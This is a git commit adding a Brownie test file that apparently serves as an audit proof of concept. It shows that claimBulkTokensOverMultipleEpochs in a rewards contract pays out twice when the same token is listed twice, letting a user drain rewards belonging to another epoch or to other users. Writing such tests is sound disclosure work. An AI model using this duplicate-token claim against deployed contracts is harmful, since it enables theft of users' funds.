79b51958edc3bdd0d5b150079df1f294cee0ac46
harleythedog <rileyholterhusdev@gmail.com>
2022-02-22 23:59:35 -0500

    add test case for duplicate token vuln

---
+++ tests/attacks/test_bulk_claim_duplicate_tokens.py
@@ -0,0 +1,42 @@
+import brownie
+from brownie import *
+from helpers.utils import (
+    approx,
+)
+AddressZero = "0x0000000000000000000000000000000000000000"
+MaxUint256 = str(int(2 ** 256 - 1))
+
+
+## Bulk claiming when there are duplicate tokens gives the user too many rewards
+def test_bulk_claim_duplicate_tokens(initialized_contract, user, fake_vault, token):
+  INITIAL_DEPOSIT = 1e18
+  REWARD_AMOUNT = 1e20
+  EPOCH = initialized_contract.currentEpoch()
+
+  ## Add rewards to vault for EPOCH
+  token.approve(initialized_contract, MaxUint256, {"from": user})
+  initialized_contract.addReward(EPOCH, fake_vault, token, REWARD_AMOUNT, {"from": user})
+
+  ## User deposits into the vault
+  initialized_contract.notifyTransfer(AddressZero, user, INITIAL_DEPOSIT, {"from": fake_vault})
+
+  ## Time passes and a new epoch starts
+  chain.sleep(initialized_contract.SECONDS_PER_EPOCH() + 1)
+  chain.mine()
+  initialized_contract.startNextEpoch()
+
+  ## Add rewards to vault for EPOCH + 1
+  initialized_contract.addReward(EPOCH + 1, fake_vault, token, REWARD_AMOUNT, {"from": user})
+
+  ## At this point, there should be REWARD_AMOUNT * 2 tokens in the contract, 
+  ## half of this belongs to EPOCH and the other half belongs to EPOCH + 1
+  assert token.balanceOf(initialized_contract) == REWARD_AMOUNT * 2
+
+  ## Now the user claims rewards just on the first epoch, but is able to steal rewards from the second epoch
+  ## by bulk claiming on duplicate tokens. This call should probably revert, but in reality it just transfers the 
+  ## user twice the amount of tokens they deserve
+  initialized_contract.claimBulkTokensOverMultipleEpochs(EPOCH, EPOCH, fake_vault, [token, token], user, {"from": user})
+
+  ## As of right now, this assert will fail, which shows the vulnerability. The user only claimed on EPOCH but stole the tokens
+  ## from EPOCH + 1. In the case of multiple users, the attacker can also steal reward tokens that belong to others
+  assert token.balanceOf(initialized_contract) == REWARD_AMOUNT
